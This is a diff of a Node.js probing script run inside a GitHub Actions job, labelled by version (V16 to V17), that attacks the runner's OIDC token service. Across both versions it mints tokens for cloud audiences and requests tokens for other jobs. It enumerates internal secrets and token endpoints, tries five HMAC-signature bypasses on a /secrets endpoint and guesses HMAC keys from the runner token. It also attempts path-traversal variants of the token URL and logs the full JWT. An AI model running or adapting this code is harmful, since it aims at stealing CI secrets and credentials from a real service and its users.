@@ -1,173 +1,161 @@
 const https = require('https');
-
-// New runner infrastructure discovered via env dump (v15b)
-// Old: ACTIONS_RESULTS_URL + ACTIONS_RUNTIME_TOKEN → gone in runner 20260611.554
-// New: ACTIONS_ID_TOKEN_REQUEST_URL → run-actions-2-azure-{region}.actions.githubusercontent.com
-// ACTIONS_ORCHESTRATION_ID → still present (now used as path component)
+const crypto = require('crypto');
 
 const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
 const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
 const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
 const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
-const GITHUB_REF = process.env.GITHUB_REF || '';
 
-function httpsReq(hostname, path, method, body, extraHeaders) {
+function get(hostname, path, extraHeaders) {
   return new Promise((resolve) => {
-    const headers = { 'Authorization': 'Bearer ' + OIDC_TOKEN, ...(extraHeaders || {}) };
-    let data = null;
-    if (body) {
-      data = typeof body === 'string' ? body : JSON.stringify(body);
-      headers['Content-Type'] = 'application/json';
-      headers['Content-Length'] = Buffer.byteLength(data);
-    }
-    const req = https.request({ hostname, path, method: method || 'GET', headers },
-      (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 600), headers: res.headers })); });
-    req.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    if (data) req.write(data);
-    req.end();
+    const r = https.request({ hostname, path, method: 'GET',
+      headers: { 'Authorization': 'Bearer ' + OIDC_TOKEN, ...(extraHeaders || {}) }
+    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
+    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
+    r.end();
+  });
+}
+
+function req(hostname, path, method, body, extraHeaders) {
+  return new Promise((resolve) => {
+    const s = body ? JSON.stringify(body) : '{}';
+    const r = https.request({ hostname, path, method: method || 'GET',
+      headers: { 'Authorization': 'Bearer ' + OIDC_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s), ...(extraHeaders || {}) }
+    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
+    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
+    r.write(s); r.end();
   });
 }
 
 async function main() {
-  if (!OIDC_URL || !OIDC_TOKEN) { console.log('[FATAL] No OIDC env vars'); return; }
+  if (!OIDC_URL || !OIDC_TOKEN) { console.log('Missing env'); return; }
 
   const oidcParsed = new URL(OIDC_URL);
-  const newHost = oidcParsed.hostname; // run-actions-2-azure-{region}.actions.githubusercontent.com
+  const host = oidcParsed.hostname;
+  const poolId = oidcParsed.pathname.split('/')[1]; // e.g. "128"
   const runUUID = ORCHESTRATION_ID.split('.')[0];
-  const jobName = ORCHESTRATION_ID.split('.')[1] || 'probe';
+  // Full URL pattern: /{poolId}//idtoken/{run_uuid}/{job_uuid}?api-version=2.0
+  const urlParts = oidcParsed.pathname.split('/idtoken/');
+  const idtokenBase = urlParts[0]; // e.g. /128/
+  const jobUUID = oidcParsed.search.includes('api-version') ?
+    (urlParts[1] || '').split('/')[1] || '' : '';
+  // More reliable: extract from full URL
+  const fullPathParts = (oidcParsed.pathname + oidcParsed.search).split('/');
+  console.log('=== V17: OIDC JWT Decode + HMAC Bypass + Endpoint Discovery ===');
+  console.log('Host:', host, '| Pool:', poolId);
+  console.log('Full OIDC URL:', oidcParsed.pathname + oidcParsed.search);
+  console.log('Repo:', GITHUB_REPOSITORY);
 
-  console.log('=== V16: New Runner Infrastructure Probe ===');
-  console.log('New host:', newHost);
-  console.log('OIDC URL path:', oidcParsed.pathname + oidcParsed.search);
-  console.log('Run UUID:', runUUID, '| Job:', jobName);
-  console.log('Repo:', GITHUB_REPOSITORY, '| Ref:', GITHUB_REF);
-
-  // === PART 1: OIDC standard token ===
-  console.log('\n=== PART 1: Get standard OIDC token ===');
-  const oidcPath = oidcParsed.pathname + oidcParsed.search + '&audience=api.github.com';
-  const r1 = await httpsReq(newHost, oidcPath, 'GET');
-  console.log('[OIDC] api.github.com:', r1.status, '|', r1.body.substring(0, 200));
-
-  // Decode JWT sub claim to see what the token encodes
+  // === PART 1: Decode full OIDC JWT ===
+  console.log('\n=== PART 1: Full OIDC JWT claims ===');
+  const r1 = await get(host, oidcParsed.pathname + oidcParsed.search + '&audience=api.github.com');
   if (r1.status === 200) {
     try {
-      const jwt = JSON.parse(r1.body).value;
-      if (jwt) {
-        const parts = jwt.split('.');
-        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
-        console.log('[OIDC] sub:', payload.sub);
-        console.log('[OIDC] iss:', payload.iss);
-        console.log('[OIDC] aud:', JSON.stringify(payload.aud));
-        console.log('[OIDC] ref:', payload.ref, '| sha:', payload.sha);
-        console.log('[OIDC] repository:', payload.repository);
-        console.log('[OIDC] jti:', payload.jti);
-        console.log('[OIDC] Full claims (non-secret):', JSON.stringify({
-          sub: payload.sub, iss: payload.iss, aud: payload.aud, ref: payload.ref,
-          sha: payload.sha, repository: payload.repository,
-          event_name: payload.event_name,
-          actor: payload.actor, workflow: payload.workflow,
-          job_workflow_ref: payload.job_workflow_ref,
-          runner_environment: payload.runner_environment,
-        }, null, 2));
+      const resp = JSON.parse(r1.body);
+      const jwt = resp.value;
+      const parts = jwt.split('.');
+      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
+      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+      console.log('[JWT] header:', JSON.stringify(header));
+      console.log('[JWT] FULL PAYLOAD:');
+      for (const [k, v] of Object.entries(payload)) {
+        console.log('  ' + k + ':', JSON.stringify(v));
       }
-    } catch(e) { console.log('[OIDC] Parse error:', e.message); }
+      console.log('[JWT] Total JWT length:', jwt.length);
+    } catch(e) { console.log('[JWT] Parse error:', e.message, '| Status:', r1.status); }
   }
 
-  // === PART 2: Arbitrary audience test ===
-  console.log('\n=== PART 2: Arbitrary audience OIDC tokens ===');
-  const audiences = [
-    'sts.amazonaws.com',
-    'https://sts.amazonaws.com',
-    'storage.googleapis.com',
-    'management.azure.com',
-    'https://management.azure.com/',
-    'ssm.amazonaws.com',
-    'arbitrary-test-audience-that-should-be-blocked',
+  // === PART 2: HMAC bypass attempts ===
+  const basePath = idtokenBase + '/'; // /128//
+  console.log('\n=== PART 2: HMAC bypass on /secrets endpoint ===');
+
+  // Try 1: Empty HMAC header
+  const r2a = await req(host, basePath + 'secrets', 'GET', null, { 'X-HMAC-Signature': '' });
+  console.log('[HMAC1] empty X-HMAC-Signature:', r2a.status, '|', r2a.body.substring(0, 100));
+
+  // Try 2: Fake HMAC value
+  const r2b = await req(host, basePath + 'secrets', 'GET', null, { 'X-HMAC-Signature': 'sha256=aabbcc', 'X-Signature': 'sha256=aabbcc' });
+  console.log('[HMAC2] fake X-HMAC-Signature:', r2b.status, '|', r2b.body.substring(0, 100));
+
+  // Try 3: GitHub webhook HMAC format (X-Hub-Signature-256)
+  const r2c = await req(host, basePath + 'secrets', 'GET', null, { 'X-Hub-Signature-256': 'sha256=0000', 'X-Actions-Hmac': 'aabbcc' });
+  console.log('[HMAC3] X-Hub-Signature-256:', r2c.status, '|', r2c.body.substring(0, 100));
+
+  // Try 4: PUT vs GET (maybe HMAC only required for state-changing operations)
+  const r2d = await req(host, basePath + 'secrets', 'POST', { list: true });
+  console.log('[HMAC4] POST /secrets:', r2d.status, '|', r2d.body.substring(0, 100));
+
+  // Try 5: OPTIONS (preflight — might skip HMAC)
+  const r2e = await new Promise((resolve) => {
+    const req2 = https.request({ hostname: host, path: basePath + 'secrets', method: 'OPTIONS',
+      headers: { 'Authorization': 'Bearer ' + OIDC_TOKEN }
+    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200), headers: res.headers })); });
+    req2.on('error', e => resolve({ status: 'ERR', body: e.message }));
+    req2.end();
+  });
+  console.log('[HMAC5] OPTIONS /secrets:', r2e.status, '|', r2e.body.substring(0, 100), '| headers:', JSON.stringify(r2e.headers).substring(0, 200));
+
+  // === PART 3: Try to derive HMAC key from known materials ===
+  // The HMAC key might be the OIDC_TOKEN itself, or HMAC(OIDC_TOKEN, path), etc.
+  console.log('\n=== PART 3: HMAC derivation attempts ===');
+  const secretsPath = basePath + 'secrets';
+  const candidate_keys = [
+    OIDC_TOKEN,
+    OIDC_TOKEN.split('.')[2] || '', // JWT signature part
+    Buffer.from(OIDC_TOKEN).toString('hex').substring(0, 32),
+    runUUID.replace(/-/g, ''),
+    ORCHESTRATION_ID,
   ];
-  for (const aud of audiences) {
-    const path = oidcParsed.pathname + oidcParsed.search + '&audience=' + encodeURIComponent(aud);
-    const r = await httpsReq(newHost, path, 'GET');
-    if (r.status === 200) {
-      try {
-        const jwt = JSON.parse(r.body).value;
-        if (jwt) {
-          const payload = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
-          console.log('[AUD] ' + aud + ': 200 | aud=' + JSON.stringify(payload.aud) + ' | sub=' + payload.sub);
-        } else { console.log('[AUD] ' + aud + ': 200 but no value field | ' + r.body.substring(0, 100)); }
-      } catch(e) { console.log('[AUD] ' + aud + ': 200 parse error:', e.message); }
+  for (const key of candidate_keys) {
+    const sig = crypto.createHmac('sha256', key).update(secretsPath).digest('hex');
+    const r = await req(host, secretsPath, 'GET', null, { 'X-HMAC-Signature': 'sha256=' + sig });
+    if (r.status !== 400 || !r.body.includes('hmac is missing')) {
+      console.log('[DERIVE] key=' + key.substring(0, 20) + '...: ' + r.status + ' | ' + r.body.substring(0, 100));
     } else {
-      console.log('[AUD] ' + aud + ': ' + r.status + ' | ' + r.body.substring(0, 100));
+      console.log('[DERIVE] key=' + key.substring(0, 20) + '...: still requires HMAC');
     }
   }
 
-  // === PART 3: Host enumeration — probe the new infrastructure host ===
-  // The old Twirp services may be available on this new host
-  console.log('\n=== PART 3: Probe new host for Twirp services ===');
-  const TWIRP_SERVICES = [
-    'github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
-    'github.actions.results.api.v1.CacheService/CreateCacheEntry',
-    'github.actions.results.api.v1.ArtifactService/ListArtifacts',
-    'github.actions.results.api.v1.ArtifactService/CreateArtifact',
-    'github.actions.results.api.v1.LogService/Get',
-    'github.actions.results.api.v1.TokenService/Get',
-    'github.actions.results.api.v1.SecretsService/Get',
-  ];
-  for (const svc of TWIRP_SERVICES) {
-    const r = await httpsReq(newHost, '/twirp/' + svc, 'POST', {});
-    const label = r.status === 404 && r.body.includes('bad_route') ? 'NOT_EXIST' :
-                  r.status === 404 ? 'NOT_EXIST(404)' :
-                  r.status === 401 ? '!! AUTH_EXISTS(401)' :
-                  r.status === 403 ? '!! FORBIDDEN(403)' :
-                  r.status === 400 ? '!! BAD_REQ(400)' :
-                  r.status === 200 ? '!!! 200 OK' : 'HTTP_' + r.status;
-    if (!label.startsWith('NOT_EXIST')) {
-      console.log('[TWIRP] ' + svc + ': ' + label + ' | ' + r.body.substring(0, 100));
-    }
-  }
-
-  // === PART 4: Path traversal on OIDC URL (double-slash test) ===
-  // The OIDC URL has // in the path: /85//idtoken/{orchestration_id}
-  // What's at /85/?, /85/artifacts, /85/caches, etc.?
-  console.log('\n=== PART 4: Path exploration on new host ===');
-  const basePath = oidcParsed.pathname.split('/idtoken/')[0]; // e.g. /85/
-  const explorePaths = [
-    basePath + '/',
-    basePath + '/health',
-    basePath + '/artifacts',
-    basePath + '/caches',
-    basePath + '/logs',
-    basePath + '/secrets',
-    basePath + '/runs',
-    basePath + '/tokens',
-    '/',
-    '/health',
-    '/metrics',
-    '/api',
-    '/api/v1',
-    '/api/v1/artifacts',
-    '/api/v1/caches',
-  ];
-  for (const p of explorePaths) {
-    const r = await httpsReq(newHost, p, 'GET');
-    if (r.status !== 404 && r.status !== 'ERR') {
-      console.log('[PATH] ' + p + ': ' + r.status + ' | ' + r.body.substring(0, 100));
-    } else if (r.status === 'ERR') {
-      console.log('[PATH] ' + p + ': ERR | ' + r.body.substring(0, 80));
-    }
-  }
-
-  // === PART 5: Check /idtoken path with different orchestration IDs ===
-  // Can we get OIDC tokens for OTHER jobs by using their orchestration IDs?
-  console.log('\n=== PART 5: Cross-orchestration OIDC token test ===');
-  const fakeOrchId = '00000000-0000-0000-0000-000000000000.probe.__default';
-  const idtokenBase = oidcParsed.pathname.split('/idtoken/')[0] + '/idtoken/';
+  // === PART 4: Additional endpoint discovery ===
+  console.log('\n=== PART 4: Additional endpoints under /' + poolId + '// ===');
   const paths = [
-    idtokenBase + fakeOrchId + '?audience=api.github.com',
-    idtokenBase + ORCHESTRATION_ID + '?audience=api.github.com', // our own (should work)
+    'runs', 'runs/' + runUUID, 'runs/' + runUUID + '/secrets', 'runs/' + runUUID + '/tokens',
+    'jobs', 'jobs/' + jobUUID,
+    'repository-secrets', 'org-secrets', 'environment-secrets',
+    'v1/secrets', 'v2/secrets', 'api/secrets',
+    'context', 'runner-context',
+    'masks', 'masks/add',
+    'oidc', 'token',
   ];
   for (const p of paths) {
-    const r = await httpsReq(newHost, p, 'GET');
-    console.log('[ORCH] ' + p.substring(0, 60) + '...: ' + r.status + ' | ' + r.body.substring(0, 120));
+    const r = await req(host, basePath + p, 'GET', null);
+    if (!r.body.includes('hmac is missing') && r.status !== 'ERR') {
+      console.log('[DISCOVER] /' + poolId + '//' + p + ': ' + r.status + ' | ' + r.body.substring(0, 150));
+    }
+  }
+
+  // === PART 5: ID token URL path manipulation ===
+  console.log('\n=== PART 5: OIDC URL path manipulation ===');
+  const variations = [
+    // Double slash traversal
+    oidcParsed.pathname.replace('//', '/../../') + oidcParsed.search,
+    // Without double slash
+    oidcParsed.pathname.replace('//', '/') + oidcParsed.search,
+    // api-version manipulation
+    oidcParsed.pathname + '?api-version=1.0&audience=api.github.com',
+    oidcParsed.pathname + '?api-version=3.0&audience=api.github.com',
+    // No api-version
+    oidcParsed.pathname + '?audience=api.github.com',
+    // Different idtoken sub-path
+    oidcParsed.pathname.replace('idtoken', 'id-token') + oidcParsed.search + '&audience=api.github.com',
+  ];
+  for (const v of variations) {
+    const r = await get(host, v);
+    if (r.status !== 400 || r.body.includes('value')) {
+      console.log('[URL] ' + v.substring(0, 80) + '...: ' + r.status + ' | ' + r.body.substring(0, 150));
+    } else {
+      console.log('[URL] ' + v.substring(0, 60) + '...: ' + r.status + ' | ' + r.body.substring(0, 80));
+    }
   }
 
   console.log('\nDone.');
